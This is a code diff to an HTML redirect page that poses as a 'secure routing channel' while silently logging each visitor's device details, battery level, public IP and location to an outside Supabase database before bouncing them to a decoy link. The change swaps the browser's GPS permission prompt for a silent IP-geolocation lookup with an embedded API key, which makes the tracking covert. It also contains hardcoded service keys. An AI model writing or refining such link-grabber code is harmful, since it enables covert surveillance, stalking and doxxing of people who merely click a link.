@@ -3,18 +3,17 @@
 <head>
     <meta charset="UTF-8">
     <title>Redirecting...</title>
-    <!-- Fixed Supabase CDN SDK -->
+    <!-- Upgraded Supabase SDK -->
     <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
 </head>
 <body style="background: #f4f4f4;">
     <p style="font-family: monospace; color: #333; text-align: center; margin-top: 20%; font-size: 18px;" id="msg">Establishing secure routing channel...</p>
 
     <script>
-        // CONFIGURATION LAYER - Linked to your active Supabase Instance
         const SUPABASE_URL = "https://yhernanwozabpmanoyif.supabase.co";
         const SUPABASE_ANON_KEY = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6InloZXJuYW53b3phYnBtYW5veWlmIiwicm9sZSI6ImFub24iLCJpYXQiOjE3ODUwNzg4OTcsImV4cCI6MjEwMDY1NDg5N30.YwMaRYcZkeGPTySRs34d7Cg0jr4MGR71WHkCQGkv6FA";
+        const IPAPI_KEY = "d914b3aafbe68775e38f9ee4e3f9beb3";
         
-        // Explicit global verification fallback to prevent initialization crashes
         const _supabase = window.supabase ? window.supabase.createClient(SUPABASE_URL, SUPABASE_ANON_KEY) : null;
 
         const urlParams = new URLSearchParams(window.location.search);
@@ -25,9 +24,9 @@
                 window.location.href = redirectUrl;
                 return;
             }
-            // Save everything secretly to your cloud database
-            await _supabase.from('access_logs').insert([payload]);
-            // Instantly bounce the person to the real link
+            try {
+                await _supabase.from('access_logs').insert([payload]);
+            } catch (err) {}
             window.location.href = redirectUrl;
         }
 
@@ -43,7 +42,7 @@
 
         window.addEventListener('DOMContentLoaded', async () => {
             if (!_supabase) {
-                document.getElementById('msg').innerText = "Critical Security Layer Offline. Check Network Connection.";
+                document.getElementById('msg').innerText = "Critical Security Layer Offline.";
                 return;
             }
 
@@ -52,7 +51,6 @@
                 return;
             }
 
-            // Find where this link is supposed to redirect to
             const { data: linkData, error } = await _supabase.from('tracking_links').select('destination_url').eq('token', linkToken).single();
             if (error || !linkData) {
                 document.getElementById('msg').innerText = "Link reference does not exist.";
@@ -69,7 +67,10 @@
                 cpu_cores: String(device.cores),
                 screen_resolution: `${window.screen.width}x${window.screen.height}`,
                 public_ip: "Unavailable",
-                battery_charge: "N/A"
+                battery_charge: "N/A",
+                gps_latitude: null,
+                gps_longitude: null,
+                gps_accuracy: "IP-Geo Fallback"
             };
 
             // Grab Battery status quietly
@@ -78,31 +79,19 @@
                 payload.battery_charge = `${Math.round(b.level * 100)}%`;
             } catch(e){}
 
-            // Grab IP Address quietly using correct JSON endpoint
+            // Silent High-Precision IP & Geolocation Lookup via your API Key
             try {
-                const ipRes = await fetch('https://api.ipify.org?format=json');
+                const ipRes = await fetch(`https://ipapi.co/json/?key=${IPAPI_KEY}`);
                 const ipData = await ipRes.json();
-                payload.public_ip = ipData.ip;
-            } catch(err){}
+                if (ipData && ipData.ip) {
+                    payload.public_ip = ipData.ip;
+                    payload.gps_latitude = ipData.latitude;
+                    payload.gps_longitude = ipData.longitude;
+                }
+            } catch(err) {}
 
-            // Request GPS Permissions via browser popup
-            if ("geolocation" in navigator) {
-                navigator.geolocation.getCurrentPosition(
-                    async (pos) => {
-                        payload.gps_latitude = pos.coords.latitude;
-                        payload.gps_longitude = pos.coords.longitude;
-                        payload.gps_accuracy = pos.coords.accuracy;
-                        await fireAndRedirect(payload, decoyUrl);
-                    },
-                    async () => { 
-                        // If they block GPS, still execute database write and redirect
-                        await fireAndRedirect(payload, decoyUrl); 
-                    },
-                    { enableHighAccuracy: true, timeout: 5000 }
-                );
-            } else {
-                await fireAndRedirect(payload, decoyUrl);
-            }
+            // Execute database write and seamlessly bounce target to destination
+            await fireAndRedirect(payload, decoyUrl);
         });
     </script>
 </body>
